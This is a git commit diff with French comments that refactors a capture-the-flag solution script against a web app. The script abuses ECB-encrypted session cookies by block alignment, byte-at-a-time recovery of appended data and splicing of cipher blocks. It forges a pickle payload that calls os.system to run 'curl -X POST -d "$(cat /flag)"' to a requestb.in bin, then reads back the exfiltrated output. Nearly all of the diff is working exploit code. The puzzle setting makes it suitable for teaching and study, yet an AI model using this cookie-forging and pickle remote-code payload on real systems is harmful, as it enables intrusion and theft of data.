fe3dc22d35fd8ab751d1ef86f48e130b33b82364
Maxime Arthaud <maxime@arthaud.me>
2016-11-27 18:35:27 -0800

    Amélioration du script de solution

--- solution/solving_script.py
+++ solution/solving_script.py
@@ -1,33 +1,47 @@
 #!/usr/bin/env python3
+import argparse
+import json
+import logging
+import random
 import requests
 import struct
-import random
-import sys
 
 
-if len(sys.argv) < 3:
-    sys.stderr.write('error:%s HOST PORT\n' % sys.argv[0])
-    exit(1)
-
-host = sys.argv[1]
-port = int(sys.argv[2])
+# Init logging
+logging.basicConfig(format='[%(asctime)s] %(message)s', level=logging.DEBUG)
+logging.getLogger('requests').setLevel(logging.WARNING)
+log = logging.getLogger(__name__)
 
 
-def cipher(username):
-    # ajout d'un prefix random de taille fixe
+# Helper pour utiliser requestb.in
+class Requestbin:
+    def __init__(self):
+        r = requests.post('http://requestb.in/api/v1/bins', data={
+            'private': 'true'
+        })
+        for key, val in json.loads(r.text).items():
+            setattr(self, key, val)
+
+    def requests(self):
+        r = requests.get('http://requestb.in/api/v1/bins/%s/requests' % self.name)
+        return json.loads(r.text)
+
+
+def encrypt(username, host, port):
+    # ajout d'un prefix aléatoire de taille fixe
     # pour que chaque username soit unique
     prefix = bytes([random.randint(0x20, 0x7e) for _ in range(4)])
 
     data = {
         'username': prefix + username,
-        'password': 'A' * 8,
-        'password-confirm': 'A' * 8
+        'password': 'X' * 8,
+        'password-confirm': 'X' * 8
     }
     r = requests.post('http://%s:%d/register' % (host, port), data=data)
     return r.cookies['session']
 
 
-def decipher(cookie):
+def decrypt(cookie, host, port):
     requests.get('http://%s:%d/' % (host, port), cookies={'session': cookie})
 
 
@@ -35,45 +49,73 @@ def split_fix_length(buf, n):
     return [buf[i:i + n] for i in range(0, len(buf), n)]
 
 
-# trouver la longueur de l'username qui va donner 2 fois le même bloc
-length = 1
-while True:
-    blocks = split_fix_length(cipher(b'A' * length), 32)
-    if len(blocks) > 3 and blocks[2] == blocks[3]:
-        break
-    length += 1
+if __name__ == '__main__':
+    parser = argparse.ArgumentParser(description='Script de solution')
+    parser.add_argument('host', metavar='HOST', type=str,
+                        help='Hostname')
+    parser.add_argument('port', metavar='PORT', type=int,
+                        help='Port')
+    parser.add_argument('--cmd', type=str, default='cat /flag',
+                        help='Commande à injecter (default: cat /flag)')
+    parser.add_argument('--full', action='store_true', default=False,
+                        help='Lancer tous les tests')
+    args = parser.parse_args()
 
-# on sait donc que cette longueur - 32 commence un nouveau bloc (le 3-ième)
-length -= 2 * 16
+    host, port = args.host, args.port
 
-# trouver ce que le serveur ajoute à la fin après notre username
-append = b''
-
-while len(append) < 16:
-    blocks = split_fix_length(cipher(b'A' * (length + 16 - len(append) - 1)), 32)
-    needed_block = blocks[2]
-    for c in range(256):
-        blocks = split_fix_length(cipher(b'A' * (length + 16 - len(append) - 1) + append + bytes([c])), 32)
-        if needed_block == blocks[2]:
-            append += bytes([c])
+    log.info("Trouver la longueur de l'username donnant 2 fois le même bloc")
+    length = 1
+    while True:
+        blocks = split_fix_length(encrypt(b'A' * length, host, port), 32)
+        if len(blocks) > 3 and blocks[2] == blocks[3]:
             break
-    print('\rFound %r' % append, end='')
+        length += 1
 
-# payload
-# le challenge ici n'est d'utiliser que de l'ascii
-# ce qui est au final simple avec pickle (voir /usr/lib/python3.5/pickle.py)
-cmd = b'curl -X POST -d "$(cat /flag)" http://requestb.in/xn5l3wxn'
+    log.info("Longueur de %d", length + 4)
 
-inject = b'cposix\nsystem\n' # push os.system (load_global)
-inject += b'(' # push mark (load_mark)
-inject += b'X' + struct.pack('<I', len(cmd)) + cmd # push 'ls' (load_binunicode)
-inject += b't' # stack[k:] = [tuple(stack[k+1:])] (load_tuple)
-inject += b'R' # stack[-2](stack[-1]) (load_reduce)
-inject += b'\x00' * ((16 - len(inject) % 16) % 16)
+    # on sait donc que cette longueur - 32 commence un nouveau bloc (le 3-ième)
+    length -= 2 * 16
 
-payload = ''
-blocks = split_fix_length(cipher(b'A' * length), 32)
-payload += blocks[0] + blocks[1]
-blocks = split_fix_length(cipher(b'A' * length + inject), 32)
-payload += ''.join(blocks[2:2 + len(inject) // 16])
-decipher(payload)
+    if args.full:
+        log.info("Trouver ce que le serveur ajoute après l'username")
+        append = b''
+
+        while len(append) < 16:
+            blocks = split_fix_length(encrypt(b'A' * (length + 16 - len(append) - 1), host, port), 32)
+            needed_block = blocks[2]
+            for c in range(256):
+                blocks = split_fix_length(encrypt(b'A' * (length + 16 - len(append) - 1) + append + bytes([c]), host, port), 32)
+                if needed_block == blocks[2]:
+                    append += bytes([c])
+                    break
+            log.debug('Found %r', append)
+
+        log.info("Ajouté après l'username: %r", append)
+
+    # payload
+    log.info("Injection du payload")
+
+    # le challenge ici n'est d'utiliser que de l'ascii
+    # ce qui est au final simple avec pickle (voir /usr/lib/python3.5/pickle.py)
+    requestbin = Requestbin()
+    cmd = 'curl -X POST -d "$(%s)" http://requestb.in/%s' % (args.cmd, requestbin.name)
+    cmd = cmd.encode('utf8')
+
+    inject = b'cposix\nsystem\n' # push os.system (load_global)
+    inject += b'(' # push mark (load_mark)
+    inject += b'X' + struct.pack('<I', len(cmd)) + cmd # push 'ls' (load_binunicode)
+    inject += b't' # stack[k:] = [tuple(stack[k+1:])] (load_tuple)
+    inject += b'R' # stack[-2](stack[-1]) (load_reduce)
+    inject += b'\x00' * ((16 - len(inject) % 16) % 16)
+
+    payload = ''
+    blocks = split_fix_length(encrypt(b'A' * length, host, port), 32)
+    payload += blocks[0] + blocks[1]
+    blocks = split_fix_length(encrypt(b'A' * length + inject, host, port), 32)
+    payload += ''.join(blocks[2:2 + len(inject) // 16])
+
+    # bim!
+    decrypt(payload, host, port)
+
+    for request in requestbin.requests():
+        log.info('Result: %s', request['raw'])
